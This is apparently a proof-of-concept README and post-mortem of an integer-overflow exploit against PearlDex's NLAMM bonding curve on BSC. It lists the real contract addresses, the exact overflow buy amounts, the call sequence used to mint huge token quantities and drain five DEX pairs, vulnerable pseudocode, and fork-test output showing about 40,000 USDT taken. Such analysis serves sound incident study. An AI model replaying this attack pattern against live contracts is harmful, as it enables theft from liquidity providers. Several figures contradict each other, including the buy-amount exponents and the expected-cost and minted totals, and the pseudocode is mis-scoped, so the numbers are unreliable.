# PearlDex-40K-PoC

| Component | Proxy | Implementation |
|---|---|---|
| NLAMM Bonding Curve | `0x5340a7278848EE51D35c30693D6FBFf06d1a0d73` | `0x1903D672C821BDF7CaBFDE1Fb4dc9EBff0494563` |
| PearlDex Router | `0x73A0Ba8BAc1B6Ae00De1E9Cf767CdB98075Ab92e` | `0x55AB5Af53852bfc5F933Ab4D7441b4B6c68ea52E` |
| Game Token (shared) | per-token address | `0xb2Da2Dfe2cD5eF5d5F72d3d82E49bAe08F27924f` |
| DEX Pair (shared) | per-pair address | `0xeF494F3CC4E3A7FF70c34C530D07f4aCB01c328c` |

| Token | Address | PearlDex Pair |
|---|---|---|
| IRON ORE | `0x26C97005Af332F0D8f6ca30451195E14fbDd8D41` | `0x9849E6828022e8b5161cd5C70f4bF38eAF78cFDe` |
| COAL | `0x40037b7503EE21ffA7747dFDdEDcb89805c9273e` | `0x3119B2f98693A333394c2E68C0b31dcDe7183DAe` |
| WOOD | `0x414Ef9A63a05e6997a9e95e7043Ee0FDc6D5119f` | `0xB38D61552658bAcdb382bb3074c104e0A2060eD0` |
| SAND | `0xEE4B91DcCa8521c549db0A2d33607869d187414f` | `0xF5784cbdd3D64dbDF882fD9F5B89109793E9f7E6` |
| CLAY | `0xE9456F10bfbff68D50F842056C108894067D9a4e` | `0x9095d1083a19bE8e390536E9aCaf5D4080ce87aa` |

Total loss: **~40,335 USDT**, starting from **0.01 BNB (~$6)**.

## Summary

An attacker exploited an **unchecked integer overflow** in the NLAMM bonding curve's `buy()` function on BSC, by crafting buy amounts that cause `amount * currentPrice` to wrap around `2^256`, the attacker minted astronomical quantities of 5 game tokens (IRON ORE, COAL, WOOD, SAND, CLAY) for near-zero cost, then dumped them on PearlDex DEX liquidity pairs.

---

## Overview

PearlDex is a BSC-based DeFi ecosystem that includes:

- **NLAMM (Non-Linear Automated Market Maker)**: A bonding curve contract that prices and mints game tokens, users pay USDT to `buy()` tokens; the cost is computed from the requested amount and the current bonding curve price.
- **PearlDex**: A Uniswap V2-style decentralized exchange with liquidity pairs for the game tokens against USDT.
- **Tokens**: Five ERC20 tokens (IRON ORE, COAL, WOOD, SAND, CLAY) used within PearlDex's game economy, all share the same token implementation via a proxy pattern.

---

## Root Cause

NLAMM bonding curve implementation at `0x1903D672C821BDF7CaBFDE1Fb4dc9EBff0494563`, function `buy()`.

**Arithmetic Overflow** — unchecked multiplication in the cost calculation.

The `buy()` function computes the USDT cost as:

```
cost = amount * currentPrice
```

This multiplication is performed inside an `unchecked {}` block (or the contract was compiled with Solidity < 0.8.0 without SafeMath), when the product exceeds `2^256 - 1`, it silently wraps around to a small value.

```
Correct:   amount * currentPrice  =  very large number (>> 2^256)
Actual:    (amount * currentPrice) mod 2^256  =  near-zero value
```

1. Charges the attacker the **overflowed (tiny)** cost in USDT
2. Mints the **full (enormous)** requested amount of tokens

There is **no validation** that the computed cost is reasonable relative to the amount requested, and **no maximum supply cap** on minting.

### Overflow Math (IRON ORE)

```
currentPrice  = 15,000,001,740,710,600 wei  (~0.015 USDT)

buyAmount     = 7,712,592,574,349,318,455,520,271,942,948,603,129,
                480,035,752,544,334,327,373,265

Expected cost = buyAmount × currentPrice
              = ~1.157 × 10^77  (astronomically large)

Actual cost   = (buyAmount × currentPrice) mod 2^256
              = 5,319,060,416,824,244 wei
              = ~0.00532 USDT

Tokens minted = 7.031 × 10^76
```

The attacker paid **0.00532 USDT** and received **7.031 × 10^76 tokens**.

---

## Exec Flow

```
Block: 82115370 | Chain: BSC
Attacker Contract: 0x23E5DE4a390702B1ff6dA7Fd0b0F17B79F8Eee1A
Profit Receiver:   0xDbCa72816b83a60f5ca7cF93a1420C6e7b215aca
```

The entire attack executes atomically in a **single transaction** via the attacker contract's constructor.

// Phase 1 — Seed Capital

```
PancakeSwap Router
  └─ swapExactETHForTokens{value: 0.01 BNB}
       path: [WBNB → USDT]
       received: ~6.05 USDT
```

// Phase 2 — Approve NLAMM

```
USDT.approve(NLAMM, type(uint256).max)
```

// Phase 3 — Overflow Buy + Dump (×5 tokens)

For each of the 5 game tokens, the attacker repeats the same pattern

```
1. NLAMM.getPrices(token, 0)          // read current bonding curve price
2. NLAMM.buy(token, 0, overflowAmt)   // buy with overflow → tiny cost, huge mint
3. PearlRouter.getPair(token, USDT)    // find the DEX pair
4. token.approve(PearlRouter, dumpAmt) // approve router
5. PearlRouter.swapExactTokensForTokens(dumpAmt, 0, [token, USDT], ...)
                                       // dump tokens → drain USDT from pair
```

// Phase 4 — Profit Extraction

```
USDT.transfer(profitReceiver, USDT.balanceOf(this))
  └─ 40,341.54 USDT → 0xDbCa72816b83a60f5ca7cF93a1420C6e7b215aca
```

---

// 4. Per-Token Breakdown

## Overflow Details

| Token | Price (USDT) | Overflow Buy Amount | Actual Cost Paid | Tokens Minted |
|---|---|---|---|---|
| IRON ORE | ~0.0150 | 7.712 × 10⁶⁰ | 0.00532 USDT | 7.031 × 10⁷⁶ |
| COAL | ~0.0010 | 8.040 × 10⁶¹ | 0.00105 USDT | 4.859 × 10⁷⁶ |
| WOOD | ~0.0050 | 2.269 × 10⁶¹ | 0.00105 USDT | 1.817 × 10⁷⁵ |
| SAND | ~0.0001 | 1.157 × 10⁶³ | 0.00010 USDT | 1.157 × 10⁷⁷ |
| CLAY | ~0.0035 | 3.308 × 10⁶¹ | 0.00249 USDT | 8.270 × 10⁷⁶ |
| **Total** | | | **~0.01 USDT** | |

## Drain Details

| Pair | USDT Before | USDT After | USDT Drained | Drain % |
|---|---|---|---|---|
| IRON ORE / USDT | 7,805.56 | 0.0079 | **7,805.56** | 99.9999% |
| COAL / USDT | 8,337.15 | 0.0084 | **8,337.14** | 99.9999% |
| WOOD / USDT | 9,541.70 | 0.0096 | **9,541.69** | 99.9999% |
| SAND / USDT | 6,468.14 | 0.0065 | **6,468.13** | 99.9999% |
| CLAY / USDT | 8,182.98 | 0.0083 | **8,182.97** | 99.9999% |
| **Total** | **40,335.53** | **~0.04** | **~40,335.49** | |

Each pair was drained to dust — only ~0.008 USDT remained per pool.

---

## 5. Financial Impact

```
Investment:     0.01 BNB  (~6.05 USDT)
Overflow costs: ~0.01 USDT (sum of 5 buy() calls)
USDT extracted: ~40,335 USDT (from 5 DEX pairs)
──────────────────────────────────────
Net profit:     ~40,329 USDT
ROI:            ~666,500%
Gas used:       1,434,392 (~$0.15)
```

---

## Deep dive

## Unchecked Arithmetic in Cost Calculation

The NLAMM implementation performs `amount * currentPrice` inside an unchecked context. In Solidity, `unchecked` blocks disable overflow/underflow revert behavior introduced in 0.8.0.

```solidity
// VULNERABLE — pseudocode reconstruction
function buy(address token, uint256 id, uint256 amount) external {
    uint256 currentPrice = _getPrice(token, id);

    unchecked {
        uint256 cost = amount * currentPrice;  // ← OVERFLOW: wraps mod 2^256
    }

    stableCoin.transferFrom(msg.sender, address(this), cost);  // tiny cost
    _mint(token, msg.sender, amount);                          // huge mint
}
```

---

### Output

```
[PASS] testExploit()

[BEFORE] PearlDex pair USDT reserves:
  IRON_ORE/USDT: 7805.566108792810440599
  COAL/USDT    : 8337.152679030941568053
  WOOD/USDT    : 9541.701251859002428914
  SAND/USDT    : 6468.141421941959623138
  CLAY/USDT    : 8182.980825919313151281

[AFTER] PearlDex pair USDT reserves:
  IRON_ORE/USDT: 0.007884402246859156
  COAL/USDT    : 0.008421357836033440
  WOOD/USDT    : 0.009638072337158248
  SAND/USDT    : 0.006533469584315531
  CLAY/USDT    : 0.008265628848778247

  USDT stolen: 40,368.084156654702154366
```

> Note: The PoC yields ~40,368 USDT vs the original ~40,341 USDT (+0.07% delta), this is because we fork at block 82,115,369 while the original attack was mid-block 82,115,370 — other transactions earlier in the block slightly altered pool reserves.

---

## 9. Attack Transaction Summary

```
Block:              82,115,370
Chain:              BNB Smart Chain (BSC)
Attacker EOA:       0xDbCa72816b83a60f5ca7cF93a1420C6e7b215aca
Attack Contract:    0x23E5DE4a390702B1ff6dA7Fd0b0F17B79F8Eee1A
Target (NLAMM):     0x5340a7278848EE51D35c30693D6FBFf06d1a0d73
Gas Used:           1,434,392
Profit:             ~40,335 USDT
```

### Call Graph

```
Attacker EOA
  └─ CREATE PearlDexExploit (0x23E5...)  [value: 0.01 BNB]
       │
       ├─ PancakeSwap.swapExactETHForTokens  →  ~6.05 USDT
       ├─ USDT.approve(NLAMM, MAX)
       │
       ├─ [IRON ORE] NLAMM.buy(overflow)  →  cost: 0.005 USDT, mint: 7e76
       │   └─ PearlRouter.swap(8.57e29)   →  drain: 7,805 USDT
       │
       ├─ [COAL]     NLAMM.buy(overflow)  →  cost: 0.001 USDT, mint: 4.8e76
       │   └─ PearlRouter.swap(1.2e31)    →  drain: 8,337 USDT
       │
       ├─ [WOOD]     NLAMM.buy(overflow)  →  cost: 0.001 USDT, mint: 1.8e75
       │   └─ PearlRouter.swap(2.1e30)    →  drain: 9,541 USDT
       │
       ├─ [SAND]     NLAMM.buy(overflow)  →  cost: 0.0001 USDT, mint: 1.1e77
       │   └─ PearlRouter.swap(1.5e32)    →  drain: 6,468 USDT
       │
       ├─ [CLAY]     NLAMM.buy(overflow)  →  cost: 0.002 USDT, mint: 8.2e76
       │   └─ PearlRouter.swap(3.5e30)    →  drain: 8,182 USDT
       │
       └─ USDT.transfer(attacker, 40,341 USDT)
```
